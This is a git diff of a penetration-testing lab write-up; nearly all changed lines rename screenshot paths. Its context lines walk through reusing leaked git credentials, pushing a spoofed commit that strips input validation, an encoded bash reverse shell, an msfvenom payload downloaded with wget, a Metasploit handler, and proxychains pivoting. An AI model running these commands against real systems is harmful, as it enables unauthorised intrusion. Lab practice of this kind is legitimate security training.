@@ -27,7 +27,7 @@ The best tools for this lab are:
 
 Pinging the website [http://online-calc.com/](http://online-calc.com) gives us an IP of 192.9.232.3
 
-![](<../../../../.gitbook/assets/image (11).png>)
+![](<../../../../.gitbook/assets/image (11) (1).png>)
 
 We'll run an nmap scan against the target
 
@@ -41,13 +41,13 @@ There is an Apache 2.4.29 HTTP server running on Port 80
 
 Some strange unrecognizable service is running on Port 5000, but it must be a webapp due to the HTTP content printed
 
-![](<../../../../.gitbook/assets/image (7).png>)
+![](<../../../../.gitbook/assets/image (7) (1).png>)
 
 Looks like there's another web server running something called Werkzeug (version 1.0.1) built with Python 2.7.17
 
 There's also a Git repository and an online calculator. So probably the project can be found here
 
-![](<../../../../.gitbook/assets/image (37).png>)
+![](<../../../../.gitbook/assets/image (37) (1).png>)
 
 According to this [article](https://testdriven.io/blog/what-is-werkzeug/):&#x20;
 
@@ -59,23 +59,23 @@ According to this [article](https://testdriven.io/blog/what-is-werkzeug/):&#x20;
 
 Let us explore each of these services beginning with port 80
 
-![](<../../../../.gitbook/assets/image (12).png>)
+![](<../../../../.gitbook/assets/image (12) (1).png>)
 
 Port 5000 hosts the actual online calculator
 
-![](<../../../../.gitbook/assets/image (21).png>)
+![](<../../../../.gitbook/assets/image (21) (1).png>)
 
 There's an error message when visiting port 8000
 
-![](<../../../../.gitbook/assets/image (28).png>)
+![](<../../../../.gitbook/assets/image (28) (1).png>)
 
 One thing that stood out in the nmap scan was this file path
 
-![](<../../../../.gitbook/assets/image (43).png>)
+![](<../../../../.gitbook/assets/image (43) (1).png>)
 
 When you visit /.git itself, you receive an error
 
-![](<../../../../.gitbook/assets/image (46).png>)
+![](<../../../../.gitbook/assets/image (46) (1).png>)
 
 However, visiting .git/config gives you a file to download
 
@@ -83,7 +83,7 @@ However, visiting .git/config gives you a file to download
 
 And its file content is interesting
 
-![](<../../../../.gitbook/assets/image (40).png>)
+![](<../../../../.gitbook/assets/image (40) (1).png>)
 
 We'll keep these credentials saved just in case they come in handy
 
@@ -91,19 +91,19 @@ Now let's run a web discovery scan against the site for any hidden directories
 
 Nothing interesting on port 80
 
-![](<../../../../.gitbook/assets/image (48).png>)
+![](<../../../../.gitbook/assets/image (48) (1).png>)
 
 Nothing interesting on port 5000 either
 
-![](<../../../../.gitbook/assets/image (33).png>)
+![](<../../../../.gitbook/assets/image (33) (1).png>)
 
 Now we have something interesting!
 
-![](<../../../../.gitbook/assets/image (41).png>)
+![](<../../../../.gitbook/assets/image (41) (1).png>)
 
 We are presented with an intereactive console where we can execute python expressions, but the console seems to be protected by a PIN
 
-![](<../../../../.gitbook/assets/image (55).png>)
+![](<../../../../.gitbook/assets/image (55) (1).png>)
 
 It doesn't allow unauthenticated access and so far we haven't found a PIN number anywhere.
 
@@ -119,15 +119,15 @@ git clone http://online-calc.com/projects/online-calc
 
 It looks like we can, and we have a couple of files we can take a look at
 
-![](<../../../../.gitbook/assets/image (47).png>)
+![](<../../../../.gitbook/assets/image (47) (1).png>)
 
 These first two files seem to be the code that's running on port 800
 
 However we're more interested in this .git folder
 
-![](<../../../../.gitbook/assets/image (16).png>)
+![](<../../../../.gitbook/assets/image (16) (1).png>)
 
-![](<../../../../.gitbook/assets/image (54).png>)
+![](<../../../../.gitbook/assets/image (54) (1).png>)
 
 Quite a bit of stuff to look through, but I'm sure we'll find something we need to get access to that console
 
@@ -135,7 +135,7 @@ Or so I thought :neutral\_face:
 
 Let's check the git logs which shows the commit logs. What we see is interesting, Arbitrary File Read and Remote Code Execution (RCE)
 
-![](<../../../../.gitbook/assets/image (14).png>)
+![](<../../../../.gitbook/assets/image (14) (1).png>)
 
 These are , however, fixed. Yet, we can use the following command to view the differences in code
 
@@ -143,7 +143,7 @@ These are , however, fixed. Yet, we can use the following command to view the di
 git diff 9aa6151c1d5e92ae0bd3d8ad8789ae9bb2d29edd 17f5d49be5ae6f0bc41fc90f5aabeccc90f6e2cd
 ```
 
-![](<../../../../.gitbook/assets/image (26).png>)
+![](<../../../../.gitbook/assets/image (26) (1).png>)
 
 Reading the code here tells us that the send\_from\_directory function sends any file from the server and if the requested path contains `..` or `%2E`, a 404 response is returned
 
@@ -153,7 +153,7 @@ Let's check the other commit difference
 git diff 4bcfb590014321deb984237da2a319206975170f 9aa6151c1d5e92ae0bd3d8ad8789ae9bb2d29edd
 ```
 
-![](<../../../../.gitbook/assets/image (20).png>)
+![](<../../../../.gitbook/assets/image (20) (1).png>)
 
 Essentially what was added seems to be user-input sanitation via the isValid function
 
@@ -161,7 +161,7 @@ We, however, want remote code execution, so we will modify the code in the API.p
 
 Comment out the part where there's input validation and commit this change to the repository
 
-![](<../../../../.gitbook/assets/image (31).png>)
+![](<../../../../.gitbook/assets/image (31) (1).png>)
 
 ```
 git status
@@ -169,7 +169,7 @@ git add .
 git commit -m "Bug Fix" --author "Jeremy McCarthy <jeremy@dummycorp.com>"
 ```
 
-![](<../../../../.gitbook/assets/image (51).png>)
+![](<../../../../.gitbook/assets/image (51) (1).png>)
 
 Git Status
 
@@ -183,7 +183,7 @@ We're commiting this as Jeremy McCarthy because we have his credentials
 
 Next we'll push these changes to the remote repository and enter in the credentials
 
-![](<../../../../.gitbook/assets/image (53).png>)
+![](<../../../../.gitbook/assets/image (53) (1).png>)
 
 We can confirm these changes with curl
 
@@ -206,11 +206,11 @@ echo 'bash -c "bash -i >& /dev/tcp/192.250.81.2/4444 0>&1"' | base64
 YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMjUwLjgxLjIvNDQ0NCAwPiYxIgo=
 ```
 
-![](<../../../../.gitbook/assets/image (17).png>)
+![](<../../../../.gitbook/assets/image (17) (1).png>)
 
 Start a netcat listener
 
-![](<../../../../.gitbook/assets/image (42).png>)
+![](<../../../../.gitbook/assets/image (42) (1).png>)
 
 Here's the payload we'll use:
 
@@ -225,9 +225,9 @@ Since our payload will be executed by the`eval`function in Python, we have to im
 Now we'll paste the payload in the textbox of the calculator webapp and press the`=`button to execute the payload to the backend\
 
 
-![](<../../../../.gitbook/assets/image (50).png>)
+![](<../../../../.gitbook/assets/image (50) (1).png>)
 
-![](<../../../../.gitbook/assets/image (19).png>)
+![](<../../../../.gitbook/assets/image (19) (1).png>)
 
 Nice, we've got a reverse shell session that is root!
 
@@ -239,9 +239,9 @@ Using the find command saves us time in finding the first flag
 find / -name flag
 ```
 
-![](<../../../../.gitbook/assets/image (9).png>)
+![](<../../../../.gitbook/assets/image (9) (1).png>)
 
-![3b2b474c06380f696b38c1498f795e054374](<../../../../.gitbook/assets/image (22).png>)
+![3b2b474c06380f696b38c1498f795e054374](<../../../../.gitbook/assets/image (22) (1).png>)
 
 The shell that we have is pretty limited, so it would be in our best interest to gain a meterpreter shell
 
@@ -251,13 +251,13 @@ We'll essentially need to generate a payload with msfvenom, upload the payload t
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.250.81.2 LPORT=9999 -f elf > reverse.elf
 ```
 
-![](<../../../../.gitbook/assets/image (44).png>)
+![](<../../../../.gitbook/assets/image (44) (1).png>)
 
 We'll start an http server on our host and use wget on the compromised host to download the payload and then start a listener with Metasploit
 
-![Used python to host our directory containing the payload](<../../../../.gitbook/assets/image (10).png>)
+![Used python to host our directory containing the payload](<../../../../.gitbook/assets/image (10) (1).png>)
 
-![Used wget to download the payload onto the compromised machine](<../../../../.gitbook/assets/image (45).png>)
+![Used wget to download the payload onto the compromised machine](<../../../../.gitbook/assets/image (45) (1).png>)
 
 After starting Metasploit, we'll enter the following commands
 
@@ -269,7 +269,7 @@ set lhost 192.250.81.2
 run
 ```
 
-![](<../../../../.gitbook/assets/image (39).png>)
+![](<../../../../.gitbook/assets/image (39) (1).png>)
 
 Now we'll change the payload on the compromised machine to an executable and then run it!
 
@@ -280,7 +280,7 @@ chmod +x reverse.elf
 
 Awesome, we've got ourselves a meterpreter shell!
 
-![](<../../../../.gitbook/assets/image (36).png>)
+![](<../../../../.gitbook/assets/image (36) (1).png>)
 
 Now we'll move on to pivoting
 
@@ -296,7 +296,7 @@ As we see, we have the compromised machine IP as well as the second machine that
 
 We will now add this route
 
-![](<../../../../.gitbook/assets/image (18).png>)
+![](<../../../../.gitbook/assets/image (18) (1).png>)
 
 Now we need to determine what services are on this second network that we have discovered. We will use a basic TCP port scanner to look for ports
 
@@ -310,7 +310,7 @@ show options
 
 Running an nmap scan against the second target yields us these results
 
-![](<../../../../.gitbook/assets/image (49).png>)
+![](<../../../../.gitbook/assets/image (49) (1).png>)
 
 There must be a firewall or something that is protecting what appears to be a web application
 
@@ -332,7 +332,7 @@ proxychains nmap -sT -P0 192.218.10.2
 
 Now these ports are open!
 
-![](<../../../../.gitbook/assets/image (52).png>)
+![](<../../../../.gitbook/assets/image (52) (1).png>)
 
 In the solution, port 8080 is supposed to be open. Even after following the solution step by step, I never got an open port 8080.
 
